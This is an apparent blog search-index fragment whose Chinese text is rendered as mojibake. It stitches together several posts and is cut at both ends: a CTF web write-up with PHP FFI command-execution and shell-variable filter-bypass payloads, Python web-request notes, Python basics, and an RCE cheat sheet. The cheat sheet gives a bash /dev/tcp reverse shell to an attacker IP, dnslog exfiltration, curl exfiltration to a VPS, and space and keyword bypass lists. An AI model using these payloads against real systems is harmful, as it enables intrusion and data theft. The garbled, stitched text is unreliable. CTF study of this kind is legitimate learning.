\"è¿æ¥æˆåŠŸ<br/>\";\n    /*ä½ è¿˜å¯ä»¥è¿›è¡Œä¸€æ¬¡æœç´¢æ“ä½œ\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //ä½ å¯ä»¥ç”¨ echo($GLOBAL); æ¥çœ‹åˆ°è¿™äº›å€¼\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//é»˜è®¤è¿™ä¸ªä¸æ˜¯é•¿è¿æ¥ï¼Œå¦‚æœéœ€è¦æ•°æ®åº“é•¿è¿æ¥ï¼Œéœ€è¦æœ€ååŠ ä¸€ä¸ªå‚æ•°ï¼šarray(PDO::ATTR_PERSISTENT => true) å˜æˆè¿™æ ·ï¼š\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\nåŒä¸Šæ”¹åå­—\n\n##### 77\n\né¦–å…ˆè¿˜æ˜¯æ‰«ç›®å½•ï¼Œæ–‡ä»¶åflag36x.txtï¼Œå°è¯•ä¸Šé¢˜æ–¹æ³•å‘ç°æ•°æ®åº“æ¶ˆå¤±ï¼Œçœ‹æç¤ºæ˜¯PHP7.4ä»¥ä¸Šçš„æ–°ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ªFFIå¯¹è±¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåˆå› ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤åæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæ‰§è¡Œåçš„ç»“æœæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¿›è¡Œè¯»å–\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\nç„¶åè®¿é—®/1.txtå³å¯\n\n##### 118\n\né¦–å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç°è¾“å…¥è¢«åŒ…å«åˆ°systemå‡½æ•°ä¸­æ‰§è¡Œï¼Œå°è¯•`echoï¼Œwhoamiï¼Œlsï¼Œcat`å…¨éƒ¨å¤±æ•ˆæƒ³æ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥ç©ºæ ¼å‘ç°å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°è¯•é€šè¿‡æ„é€ ç³»ç»Ÿå˜é‡æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹æç¤ºçš„å›¾ç‰‡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 16.39.03.png)\n\nå‘ç°æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡å‰ªè£æ„é€ å˜é‡ï¼Œè¯»å–æ–‡ä»¶å‘½ä»¤æœ€å®¹æ˜“è¿›è¡Œæ„é€ çš„å°±æ˜¯`nl`ï¼Œæƒ³æ‹¼æ¥å‡ºnlåªéœ€è¦å–ç³»ç»Ÿé…ç½®å˜é‡æœ€åä¸€ä½nå’Œå½“å‰æ‰§è¡Œç›®å½•æœ€åä¸€ä½lå³å¯ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\nå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œæ˜¯å› ä¸ºè¿‡æ»¤äº†æ•°å­—ï¼Œæ²¡å…³ç³»ï¼Œå‰ªè£å­—ç¬¦è¿˜å¯é€šè¿‡å¤§å†™å­—æ¯è§£å†³ï¼ŒçœŸÂ·æœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**ç³»ç»Ÿå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n$PATH ç³»ç»Ÿé…ç½®å˜é‡\n$PWD å½“å‰æ‰§è¡Œç›®å½•\n$HOME é»˜è®¤è¿›å…¥çš„ç›®å½•\n$SHELL\n$USER å½“å‰user\n$SHLVL ä»£è¡¨å½“å‰shellçª—å£çš„æ·±åº¦ï¼Œä¸€èˆ¬ä¸º1\n$PHP_CFLAGS æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS=-I/usr/include -I/path/includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚\n$PHP_VERSION PHPç‰ˆæœ¬\n\n```\n\n**Linuxå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n${å˜é‡å:ä»å“ªä¸€ä½å¼€å§‹å–:å–å¤šé•¿}ï¼Œå¦‚æ²¡æœ‰é•¿åº¦é»˜è®¤å–åˆ°æœ€åï¼Œå¦‚æœæ²¡æœ‰èµ·å§‹ä½å°±ä»å¤´å¼€å§‹\n${#å˜é‡å}ï¼Œä»£è¡¨è¿™ä¸ªå˜é‡çš„é•¿åº¦\n$\n```\n\n##### 119\n\nå…ˆå°è¯•ä¸Šä¸€æŠŠçš„æ˜¯å¦å¯è¡Œï¼Œä¸è¡Œæ‰€ä»¥ç›´æ¥çœ‹æç¤ºå§ï¼Œç³»ç»Ÿå˜é‡çš„çŸ¥è¯†è¡¥å……åœ¨ä¸Šä¸€é“é¢˜äº†ï¼Œé’ˆå¯¹æœ¬é¢˜\n\n```\nSHLVLçš„å€¼ä¸º2ï¼Œ#SHLVLçš„å€¼ä¸º1ï¼Œä»PHP_VERSIONçš„ç¬¬äºŒä½å–ä¸€ä¸ªä¸º3ï¼Œä¹Ÿå°±æ˜¯${PHP_VERSION:${SHLVL}:${#SHLVL}}ä¸º3ï¼Œæœ€ç»ˆå–\nPHP_CFLAGSå˜é‡ä»ç¬¬ä¸‰ä½å¼€å§‹çš„å‰ä¸‰ä¸ªå³å¯æ„é€ tac\n```\n\næœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\nä¸Šä¸€æŠŠçš„å­—ç¬¦å¤ªé•¿äº†ï¼Œåªèƒ½é€šè¿‡åˆ«çš„å‘½ä»¤è¯»å–äº†\n\n```\ntipsï¼šLinuxä¸­çš„base64åœ¨/binç›®å½•ä¹‹ä¸‹ï¼Œbase64 æ–‡ä»¶åå³å¯å°†æ–‡ä»¶è¿›è¡Œbase64ç¼–ç \n```\n\næ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ„é€ å‡ºç»“æœä¸º/bin/base64 flag.phpå³å¯\n\né¦–å…ˆæ˜¯/å­—ç¬¦ï¼ŒPWDé¦–ä½ï¼Œè€Œåbinå¯ä½¿ç”¨é€šé…ç¬¦ï¼Œå°è¯•base64ä¹Ÿä½¿ç”¨é€šé…ç¬¦ä¸å¯è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•æ„å»ºå‡ºæ•°å­—4æ¥åŒ¹é…\n\n```\ntipsï¼šRANDOMå˜é‡èƒ½ç”Ÿæˆä¸€ä¸‡ä»¥å†…çš„éšæœºæ•°ï¼Œç”¨#å–é•¿åº¦å³å¯æœ‰æ¦‚ç‡å¾—åˆ°4\n```\n\næœ€ç»ˆpayload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~å¤šåˆ·æ–°å‡ æ¬¡æ€»ä¼šå‡ºæ¥çš„~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 19.36.51.png)\n\n##### 121\n\nå°è¯•ä¸Šé¢˜payloadï¼Œå‘ç°SHLVLè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ª1\n\n```\ntips:é€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯\n```\n\næ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨${#?}å³å¯æ„é€ å‡º1ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\næ»¤äº†PWDä½†æ˜¯æœ‰HOMEï¼ŒHOMEæ›¿æ¢PWDå°±è¡Œï¼Œæ»¤äº†#å·æ²¡å‘å»é•¿åº¦ï¼ŒRANDOMå–ä¸€ä½å³å¯ï¼Œéšæœºåˆ°äº†å°±æ˜¯èƒœåˆ©\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n**124**\n","tags":["CTF","web"]},{"title":"Pythonäºwebå±‚åº”ç”¨","url":"/posts/4256.html","content":"\n# Pythonäºwebå±‚åº”ç”¨\n\n## HTTPåè®®åŸºç¡€\n\n### åè®®åˆ†ç±»\n\nHTTP 1.0 80ç«¯å£ å•æ¬¡ä¸€ä¸ªé“¾æ¥\n\nHTTP 1.1 80ç«¯å£ å¤šæ¬¡å¯ä¸€ä¸ªé“¾æ¥\n\nHTTPåè®®ä¸å¤Ÿå®‰å…¨ï¼Œè¿›è€Œå‘å±•å‡ºäº†HTTPSåè®®\n\nHTTPS 443ç«¯å£ åŠ å¯†åæ•°æ®ä¼ è¾“\n\n<!--more-->\n\n### è¯·æ±‚æ–¹æ³•\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1ä¸HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URLæ ¼å¼\n\nåè®®://ä¸»æœºå.åŸŸå/æ–‡ä»¶å¤¹/æ–‡ä»¶?å‚æ•°=å€¼&å‚æ•°=å€¼\n\n### HTTPè¯·æ±‚å¤´\n\nUser-Agentï¼šæµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯\n\nAccept-encodingï¼šæµè§ˆå™¨æ¥å—çš„ç¼–ç \n\nRefererï¼šå½“å‰ç½‘é¡µè·³è½¬æ¥æº\n\nCookieï¼šé¡¾åæ€ä¹‰ï¼Œ~~å¥½åƒçš„é¥¼å¹²ï¼Œ~~Cookieä¿¡æ¯\n\nLocationï¼šè·³è½¬åˆ°å“ªé‡Œ\n\nSet-Cookieï¼šè®¾ç½®Cookieä¿¡æ¯\n\nWWW-Authenticateï¼šç”¨äºèº«ä»½éªŒè¯HTTP Basicç­‰\n\n### HTTPå“åº”çŠ¶æ€ç \n\n1XXï¼šä¿¡æ¯æç¤º\n\n2XXï¼šæˆåŠŸ\n\n3XXï¼šé‡å®šå‘\n\n4XXï¼šå®¢æˆ·ç«¯é”™è¯¯\n\n5XXï¼šæœåŠ¡ç«¯é”™è¯¯\n\n### æŸ¥çœ‹HTTP\n\nä½¿ç”¨æµè§ˆå™¨å®¡æŸ¥è¿›è¡ŒæŸ¥çœ‹\n\nä½¿ç”¨Burpsuiteæˆªæ–­æŸ¥çœ‹\n\n## Pythonä½¿ç”¨HTTPè¯·æ±‚\n\n###### GETè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.get(url)`\n\nå¸¦å‚æ•°`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\nè¿”å›çš„å¯¹è±¡r.urlè·å–url\n\n###### POSTè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.post(url)`\n\nå¸¦å‚æ•°`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### è‡ªå®šä¹‰è¯·æ±‚å¤´\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### å…¶ä»–è¯·æ±‚\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Pythonå¤„ç†HTTPå“åº”\n\n**è·å–ç›¸åº”çŠ¶æ€ç ï¼š**r.status_code\n\n**è·å–å“åº”æ–‡æœ¬ï¼š**r.contentï¼ˆè·å–åˆ°äºŒè¿›åˆ¶å†…å®¹ï¼‰r.textï¼ˆè·å–åŸå§‹æ–‡æœ¬ä»£ç ï¼‰\n\n**è·å–ç›¸åº”å¤´ï¼š**r.headers\n\n**è·å–è¯·æ±‚å¤´ï¼š**r.reuqests.headers\n\n**è·å–è¯·æ±‚URLï¼š**r.url\n\n**è·å–Cookieï¼š**r.cookies\n\n## Pythonè®¾ç½®HTTPä»£ç†\n\n**ä»£ç†è®¾ç½®ï¼š**httpå’Œhttps:`proxies={'http':'http://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£','https':'https://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£'}`\n\n**å‚æ•°è®¾ç½®ï¼š**`proxies=proxies,verfiy=False`\n\n## Pythonä¼šè¯ç¼–ç¨‹\n\né€šè¿‡Set-Cookieè®¾ç½®ä¸€ä¸ªcookieå€¼\n\nä½¿ç”¨`s=requesets.Session()`å»ºç«‹ä¸€ä¸ªæ–°çš„ç©ºä¼šè¯\n\n`r=s.get(url)`æ¥åœ¨ä¼šè¯ä¸­å‘èµ·ä¸ªä½“è¯·æ±‚\n\n## Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·\n\n###### ç›®å½•æ‰«æåŸç†\n\n1ã€è¯»å–å­—å…¸æ–‡ä»¶æ‹¼æ¥URL\n\n2ã€é€šè¿‡getè¯·æ±‚è®¿é—®URL\n\n3ã€è·å–çŠ¶æ€ç åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨\n\n###### å­—å…¸æ–‡ä»¶è¯»å–\n\n1ã€`with open(\"filename.txt\",\"r\") as f:`\n\n2ã€è¯»å–æ–¹å¼ï¼š\n\n- `f.readline()//è¯»å–ä¸€è¡Œ`\n- `f.readlines()//é€è¡Œè¯»å–åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­`\n- `f.read(å­—èŠ‚æ•°)//æŒ‰å­—èŠ‚è¯»`\n- `line.strip()//å»é™¤ç©ºè¡Œ`\n\n3ã€`f.close()`å…³é—­æ–‡ä»¶æµ\n\n4ã€sysåº“ä¸­çš„sys.argv[0]ä¸ºå½“å‰pythonæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œsys.argv[1]ä¸ºä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°\n\n5ã€User-Agenté€šè¿‡æŠ“åŒ…å…ˆè·å–çœŸå®çš„User-Agentï¼Œå†é€šè¿‡headerså­—å…¸ä¼ å…¥getè¯·æ±‚\n\n## IIS PUTæ¼æ´\n\nIISä¸­æ‹“å±•å·¥å…·WebDAVæ”¯æŒHTTPæ–¹æ³•ï¼Œä¹Ÿæä¾›äº†ä¸€äº›å…¶ä»–åŠŸèƒ½å¼ºå¤§çš„æ–¹æ³•ï¼ˆMoveï¼‰ï¼Œä½¿å¾—å¼€å¯WebDAVå¯ä»¥ç›´æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶\n\n**æ¢æµ‹æ–¹æ³•ï¼š**é€šè¿‡HTTPä¸­optionsæ–¹æ³•å¯ä»¥æ¢æµ‹å‡ºæœåŠ¡å™¨æ”¯æŒçš„HTTPæ–¹æ³•\n\n**æ¢æµ‹è¿‡ç¨‹ï¼š**\n\n- ç¡®å®šç›®æ ‡ä¸»æœº\n- ä½¿ç”¨HTTP optionsæ–¹æ³•æ¢æµ‹\n- æŸ¥çœ‹è¿”å›ç»“æœä¸­æ˜¯å¦å­˜åœ¨MOVE PUT\n- æŸ¥çœ‹å“åº”å¤´ä¸­çš„PUBLICå±æ€§\n\n## æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯\n\nç›¸åº”å¤´ä¸­çš„Serverï¼šæœåŠ¡å™¨ä¸­é—´ä»¶å±æ€§\n\nX-Powered-Byï¼šæœåŠ¡å™¨è„šæœ¬æŠ€æœ¯\n\n## Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·\n\né¦–å…ˆäº†è§£æ¼æ´äº§ç”ŸåŸç†ï¼Œæ ¹æ®æ¼æ´åŸç†å†™å‡ºå¯¹åº”çš„POCä»£ç æ¥éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨\n\n## æ„å»ºç«™ç‚¹åœ°å›¾\n\næµ‹è¯•Web Appçš„é¦–è¦ä»»åŠ¡å°±æ˜¯è·å–ç«™ç‚¹å®Œæ•´çš„ç›®å½•å’Œæ–‡ä»¶\n\n###### æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ\n\n1ã€é€šè¿‡åŸºäºå­—å…¸çš„ç›®å½•æ–‡ä»¶æ‰«æ\n\n2ã€é€šè¿‡åŸºäºç½‘ç»œçˆ¬è™«çš„æŠ€æœ¯ï¼ˆå¯é€šè¿‡requestsåº“æ„å»ºï¼Œä½†æ˜¯å¾ˆå¤æ‚ï¼Œæœ‰scrapyåº“å¯ç”¨äºæ„å»ºçˆ¬è™«ï¼‰\n\n3ã€é€šè¿‡Burpsuiteæ„å»ºç½‘ç«™åœ°å›¾\n","tags":["web"]},{"title":"PythonåŸºç¡€","url":"/posts/14702.html","content":"\n# PythonåŸºç¡€\n\n#### æ•°æ®ç±»å‹ï¼š\n\nstringï¼ˆå­—ç¬¦ä¸²ï¼‰\n\nnumï¼ˆæ•°å­—ï¼‰\n\nboolï¼ˆå¸ƒå°”ï¼‰\n\nlistï¼ˆåˆ—è¡¨ï¼‰ä½¿ç”¨[    ]å®šä¹‰\n\ntupleï¼ˆå…ƒç»„ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼ˆæ— åºï¼‰\n\ndictionaryï¼ˆå­—å…¸ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼Œå†…å®¹ä¸ºï¼šä¸‹æ ‡å:å…ƒç´ å†…å®¹\n\n<!--more-->\n\n#### å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š\n\n###### æŸ¥æ‰¾ï¼š\n\n```python\nstr.find(str1,start,end)//rfindä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\nstr.index(str1,start,end)//rindexä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\n```\n\nåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨str1ï¼Œå­˜åœ¨è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸å­˜åœ¨findè¿”å›-1ï¼ŒindexæŠ¥é”™\n\n```python\nstr.count(str1,start,end)\n```\n\næŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æŸå­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°\n\n###### æ›¿æ¢ï¼š\n\n```python\nstr.replace(old,new,count)\n```\n\nå°†å­—ç¬¦ä¸²ä¸­oldå†…å®¹æ›¿æ¢ä¸ºnewï¼Œcountä¸ºæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ï¼Œä¸æ”¹å˜åŸæ¥å­—ç¬¦ä¸²\n\n###### åˆ‡å‰²ï¼š\n\n```python\nstr.split(str1,count)\n```\n\nå°†å­—ç¬¦ä¸²ä»¥str1ä¸ºåˆ†éš”åˆ‡å‰²ï¼Œcountä¸ºæœ€å¤§åˆ‡å‰²æ¬¡æ•°ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä¸æ”¹å˜åŸæœ‰å­—ç¬¦ä¸²ï¼Œé»˜è®¤æŒ‰ç©ºç™½å­—ç¬¦è¿›è¡Œå…¨åˆ‡å‰²\n\n###### åŠ å…¥ï¼š\n\n```python\nstr.join(å¯è¿­ä»£å¯¹è±¡)\n```\n\nå°†stræ’å…¥åˆ°å¯è¿­ä»£å¯¹è±¡ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n\n###### ä¹±ä¸ƒå…«ç³Ÿï¼š\n\n```python\ncapitalize(str)//å°†å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™\ntitle(str)//å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™\nstr.startwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1å¼€å¤´\nstr.endwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1ç»“å°¾\nstr.upper()//å­—æ¯å…¨å¤§å†™\nstr.lower()//å­—æ¯å…¨å°å†™\n```\n\n\n\n\n\ninputè¾“å…¥\n\nprintè¾“å‡º\n\nreadè¯»æ–‡ä»¶ï¼ˆæŒ‰å­—èŠ‚è¯»ï¼‰ï¼Œreadlineï¼ˆæŒ‰è¡Œè¯»ï¼‰\n\nopen(\"æ–‡ä»¶å\"ï¼Œ\"æ‰“å¼€æ–¹å¼ï¼ˆråªè¯»ï¼Œwå†™å…¥ï¼Œaè¿½åŠ ï¼Œï¼ˆbï¼‰ä»£è¡¨ä»¥äºŒè¿›åˆ¶æ‰“å¼€ï¼Œï¼ˆ+ï¼‰ä»£è¡¨è¯»å†™ï¼‰\"ï¼Œencoding=\"ç¼–ç æ–¹å¼\")æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶è¿›è¡Œè¯»å†™æ—¶ä¸èƒ½æŒ‡å®šencodingæ–¹å¼ï¼‰\n\n*argsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå…ƒç»„\n\n**kwargsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå­—å…¸\n\n#### Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°\n\n```python\na=1 #aåœ°å€å¼•ç”¨ä¸º1\nb=a #aåœ°å€å¼•ç”¨ä¸º2\ndel a #aåœ°å€å¼•ç”¨ä¸º1\ndel b #aåœ°å€å¼•ç”¨ä¸º0ï¼Œæ­¤æ—¶aå¼•ç”¨åœ°å€è¢«é”€æ¯\n```\n\n","tags":["Python"]},{"title":"RCEè¿œç¨‹ä»£ç æ‰§è¡Œ","url":"/posts/47881.html","content":"\n# **RCEè¿œç¨‹ä»£ç æ‰§è¡Œ**\n\n#### **ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š**\n\n1ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 2ã€è®°å½•ç”¨æˆ·è¾“å…¥ 3ã€æ§åˆ¶é”®ç›˜é¼ æ ‡ 4ã€ä»»æ„ä¸Šä¼ ä¸‹è½½ 5ã€æˆªå±\n\n<!--more-->\n\n#### **äºŒã€RCEäº§ç”ŸåŸå› ï¼š**\n\n1ã€æœåŠ¡å™¨ä¸Šæœ‰æœ¨é©¬ \n\n2ã€è„†å¼±æœåŠ¡æœªæˆæƒ\n\n3ã€é€šè¿‡æ•°æ®åº“å†™æœ¨é©¬ \n\n4ã€æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶åŒ…å« \n\n5ã€å±é™©å‡½æ•°ï¼ˆevalï¼Œassertï¼Œsystemï¼Œshell_execï¼Œexecï¼Œfile_put_contentsï¼‰ \n\n6ã€å‘½ä»¤æ‰§è¡Œ \n\n7ã€ååºåˆ—åŒ–\n\n#### **ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š**\n\n##### **1ã€RCEé»‘åå•è¿‡æ»¤ï¼š**\n\nlinuxæ‰§è¡Œå‘½ä»¤ç‰¹æ®Šå­—ç¬¦ï¼šï¼ˆ;åˆ†å‰²å‘½ä»¤ï¼‰ï¼ˆ&&åœ¨å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ||å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥çš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ|å°†å‰é¢å‘½ä»¤æ‰§è¡Œçš„ç»“æœä½œä¸ºè¾“å…¥ï¼Œè¾“å…¥åˆ°åé¢å‘½ä»¤ä¸­æ‰§è¡Œï¼‰ï¼ˆ``å°†å‘½ä»¤æ‰§è¡Œç»“æœä½œä¸ºå‘½ä»¤å†æ¬¡æ‰§è¡Œï¼‰ï¼ˆ$()å’Œå‰ä¸€ä¸ªä¸€æ ·ï¼‰\n\nè¿‡æ»¤ç©ºæ ¼åå¯ä½¿ç”¨<å‘å‘½ä»¤ä¼ å…¥å‚æ•°ï¼Œ${IFS}ä¸ºç©ºæ ¼ï¼Œ%0aä¸ºåˆ†å·è½¬è¯‘\n\n`catç»•è¿‡å¯ä½¿ç”¨tac more less head tac tail nl od(äºŒè¿›åˆ¶æŸ¥çœ‹) vi vim sort uniq`\n\n`ç»•è¿‡ç©ºæ ¼ç”¨%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flagç»•è¿‡å¯ä½¿ç”¨é€šé…ç¬¦f*`\n\n##### **2ã€RCEæ— å›æ˜¾ï¼š**\n\nï¼ˆ1ï¼‰ã€åå¼¹shellï¼šæ”»å‡»ç«¯ç›‘å¬ä¸€ä¸ªç«¯å£å¦‚ï¼š2333 \n\nâ€‹\tæ”»å‡»ç«¯ä½¿ç”¨ï¼š\n\n```shell\nnc -lvp ç›‘å¬çš„ç«¯å£\n```\n\nâ€‹\tå—å®³ç«¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆä¸€ä¸ªåå¼¹shellï¼š\n\n```shell\nbash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\n```\n\nâ€‹\tåœ¨æ”»å‡»ç«¯ç»ˆç«¯å³å¯åœ¨å—å®³ç«¯ä¸­æ‰§è¡Œå‘½ä»¤\n\nï¼ˆ2ï¼‰ã€dnslogï¼šé€šè¿‡ping $(å‘½ä»¤).åŸŸå é€šè¿‡è¿™ç§æ–¹å¼è·å–å‘½ä»¤æ‰§è¡Œç»“æœ\n\nï¼ˆ3ï¼‰ã€å†™æ–‡ä»¶ï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨echoå‘½ä»¤ï¼š\n\n```shell\necho \"å†™å…¥å†…å®¹\">test.txt\n```\n\nï¼ˆ4ï¼‰ã€curlç­‰ç½‘ç»œå‘½ä»¤ï¼šé€šè¿‡POSTç­‰æ–¹å¼ç›´æ¥ç»™åˆ°ä¸ªäººç§æœ‰VPSä¸­\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3ã€RCEåå‘ç°ä¸å‡ºç½‘**\n\nï¼ˆ1ï¼‰ã€å†™æ–‡ä»¶\n\nï¼ˆ2ï¼‰ã€å‘½ä»¤ç›²æ³¨ï¼šå‘½ä»¤||sleep 100\n\nï¼ˆ3ï¼‰ã€éšè”½ä¿¡é“\n\n##### 4ã€å­—ç¬¦ç»•è¿‡\n\nï¼ˆ1ï¼‰ã€\n\n```\nä½¿ç”¨''æˆ–\"\"éš”æ–­å­—ç¬¦ä¸²\n```\n\nï¼ˆ2ï¼‰ã€ç©ºæ ¼å¯ä½¿ç”¨ï¼š<ï¼Œ<>ï¼Œ${IFS}ï¼Œ$IFSï¼Œ%20(space)ï¼Œ%09(tab)ï¼Œ$IFS$9ï¼Œ$IFS$1 æ›¿æ¢\n\nï¼ˆ3ï¼‰ã€åˆ†å·å¯ä½¿ç”¨ï¼š%0aï¼Œ%0dï¼Œ%0Dï¼Œ%0A æ›¿æ¢\n\nï¼ˆ4ï¼‰ã€ä½¿ç”¨base64ç¼–ç ï¼šY2F0IGZsYWcucGhw|base64ï¼Œå°†å…¶ä¸­å†…å®¹è§£ç åæ‰§è¡Œ\n\nï¼ˆ5ï¼‰ã€ä½¿ç”¨`åå¼•å·åŒ…è£¹å‘½ä»¤ï¼Œå°†å…¶ä¸­å†…å®¹ä½œä¸ºå‰ä¸€å‘½ä»¤çš„è¾“å…¥\n\n##### 